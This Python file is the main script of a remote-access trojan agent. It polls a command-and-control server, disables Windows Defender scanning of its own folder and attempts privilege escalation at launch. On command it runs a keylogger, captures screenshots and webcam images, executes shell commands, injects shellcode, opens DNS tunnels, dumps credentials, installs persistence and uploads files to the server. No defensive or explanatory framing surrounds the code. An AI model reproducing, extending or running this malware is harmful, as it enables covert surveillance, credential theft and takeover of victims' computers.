import uuid
import time
import platform
import json
import base64
import logging
import requests
import threading
import importlib
from datetime import datetime
import traceback
import subprocess
import os

# Import all required module functions
from modules.system_info import get_system_info
from modules.process import list_processes
from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger, is_keylogger_running
from modules.shell import execute_command
from modules.files import list_directory, read_file
from modules.shellcode import inject_shellcode
from modules.dns_tunnel import start_dns_tunnel
from modules.privesc import attempt_privilege_escalation
from modules.credential_dump import dump_credentials
from modules.persistence import install_persistence

# === Configuration ===
C2_URL = "http://192.168.200.35:5001"# Update this to your C2 server's IP address
BEACON_INTERVAL = 10
agent_id = f"agent_{uuid.uuid4()}"
# ======================

# Logger setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def check_module_dependencies():
    """Check if all required modules are available and working"""
    module_status = {}
    try:
        # Test system_info module
        system_info = get_system_info()
        module_status['system_info'] = True
    except Exception as e:
        logging.error(f"System info module error: {str(e)}")
        module_status['system_info'] = False

    # Test other modules
    modules_to_test = {
        'process': list_processes,
        'surveillance': take_screenshot,
        'shell': execute_command,
        'files': list_directory
    }

    for module_name, test_func in modules_to_test.items():
        try:
            test_func()
            module_status[module_name] = True
        except Exception as e:
            logging.error(f"{module_name} module error: {str(e)}")
            module_status[module_name] = False

    return module_status

def register():
    system_info = get_system_info()
    module_status = check_module_dependencies()
    payload = {
        "agent_id": agent_id,
        "system_info": system_info,
        "module_status": module_status,
        "status": "active"
    }
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    try:
        r = requests.post(f"{C2_URL}/api/agents/register", json={"data": encoded}, timeout=10)
        if r.ok:
            logging.info("Registered with C2")
        else:
            logging.warning(f"Registration failed: {r.text}")
    except requests.exceptions.ConnectionError:
        logging.error(f"Could not connect to C2 server at {C2_URL}. Please check if the server is running and accessible.")
    except Exception as e:
        logging.error(f"Registration error: {str(e)}")

def send_beacon():
    while True:
        payload = {
            "agent_id": agent_id,
            "status": "online"
        }
        encoded = base64.b64encode(json.dumps(payload).encode()).decode()
        try:
            r = requests.post(f"{C2_URL}/api/agents/beacon", json={"data": encoded})
            if r.status_code != 200:
                logging.error("Beacon failed: " + r.text)
        except Exception as e:
            logging.error("Beacon error: " + str(e))
        time.sleep(BEACON_INTERVAL)

def fetch_tasks():
    while True:
        try:
            r = requests.get(f"{C2_URL}/api/tasks/{agent_id}")
            if r.ok:
                resp = r.json()
                if 'data' in resp:
                    # Decode base64-encoded task JSON
                    task_json = base64.b64decode(resp['data']).decode()
                    task = json.loads(task_json)
                    if task.get("status") == "pending":
                        run_task(task)
            else:
                logging.error("Error getting tasks: " + r.text)
        except Exception as e:
            logging.error("Task fetch error: " + str(e))
        time.sleep(BEACON_INTERVAL)

def send_result(task_id, result):
    payload = {
        "agent_id": agent_id,
        "task_id": task_id,
        "result": result,
        "timestamp": datetime.now().isoformat()
    }
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    try:
        r = requests.post(f"{C2_URL}/api/results", json={"data": encoded})
        if not r.ok:
            logging.error("Result send failed: " + r.text)
    except Exception as e:
        logging.error("Result send error: " + str(e))

def send_agent_log(log_message):
    payload = {
        "task_id": "agent_log_" + datetime.now().strftime("%Y%m%d_%H%M%S"),
        "agent_id": agent_id,
        "data": {
            "status": "agent_log",
            "log": log_message,
            "timestamp": datetime.now().isoformat()
        }
    }
    try:
        r = requests.post(f"{C2_URL}/api/results", json=payload)
    except Exception as e:
        pass  # If this fails, just log locally

def run_task(task):
    """Execute a task and send back the result"""
    task_id = task.get('task_id')
    task_type = task.get('type')
    task_data = task.get('data', {})
    result = None

    try:
        logging.info(f"Executing task {task_id} of type {task_type}")
        # Map task types to functions (support both dot and underscore naming)
        task_handlers = {
            'system.get_info': get_system_info,
            'system_get_info': get_system_info,
            'process.list': list_processes,
            'process_list': list_processes,
            'surveillance.screenshot': take_screenshot,
            'surveillance_screenshot': take_screenshot,
            'surveillance.webcam': capture_webcam,
            'surveillance_webcam': capture_webcam,
            'surveillance.keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
            'surveillance_keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
            'shell.execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
            'shell_execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
            'files.browser': lambda: list_directory(task_data.get('path', '.')),
            'files_browser': lambda: list_directory(task_data.get('path', '.')),
            'shellcode.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
            'shellcode_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
            'dns_tunnel.start': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
            'dns_tunnel_start': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
            'privesc.auto': attempt_privilege_escalation,
            'privesc_auto': attempt_privilege_escalation,
            'credentials.dump': dump_credentials,
            'credentials_dump': dump_credentials,
            'persistence.install': lambda: install_persistence(task_data.get('method', 'registry')),
            'persistence_install': lambda: install_persistence(task_data.get('method', 'registry')),
            'files.download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
            'files_download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
        }
        # Execute the task
        if task_type in task_handlers:
            result = task_handlers[task_type]()
        else:
            result = f"Unknown task type: {task_type}"
        # Flatten file/image results for download
        file_types = [
            'files.download', 'files_download',
            'surveillance.screenshot', 'surveillance_screenshot',
            'surveillance.webcam', 'surveillance_webcam'
        ]
        if task_type in file_types and isinstance(result, dict) and 'data' in result:
            send_result(task_id, {
                'status': result.get('status', 'success'),
                'data': result['data'],
                'format': result.get('format'),
                'path': result.get('path'),
                'filename': os.path.basename(result.get('path', '')) if result.get('path') else None,
                'timestamp': result.get('timestamp', datetime.now().isoformat()),
                'type': task_type
            })
        else:
            send_result(task_id, {
                'status': 'success',
                'data': result,
                'timestamp': datetime.now().isoformat(),
                'type': task_type
            })
    except Exception as e:
        error_msg = f"Task execution failed: {str(e)}"
        tb = traceback.format_exc()
        logging.error(error_msg)
        send_result(task_id, {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat(),
            'type': task_type
        })
        send_agent_log(tb)

def auto_task_post_startup():
    logging.info("Running startup modules...")
    results = {
        "system_info": get_system_info()
    }
    for key, value in results.items():
        task_id = f"{key}_{datetime.now().strftime('%H%M%S')}"
        send_result(task_id, value)

def try_auto_priv_esc():
    result = attempt_privilege_escalation()
    if result.get('status') == 'success':
        logging.info('Privilege escalation succeeded.')
    else:
        logging.warning('Privilege escalation failed or not needed.')

def add_defender_exclusion():
    agent_dir = os.path.dirname(os.path.abspath(__file__))
    try:
        subprocess.run([
            "powershell",
            "-Command",
            f"Add-MpPreference -ExclusionPath '{agent_dir}'"
        ], check=True)
        logging.info(f"Added Defender exclusion for: {agent_dir}")
    except Exception as e:
        logging.warning(f"Failed to add Defender exclusion: {e}")

if __name__ == "__main__":
    add_defender_exclusion()
    register()
    try_auto_priv_esc()
    auto_task_post_startup()
    threading.Thread(target=send_beacon, daemon=True).start()
    threading.Thread(target=fetch_tasks, daemon=True).start()
    while True:
        time.sleep(60)
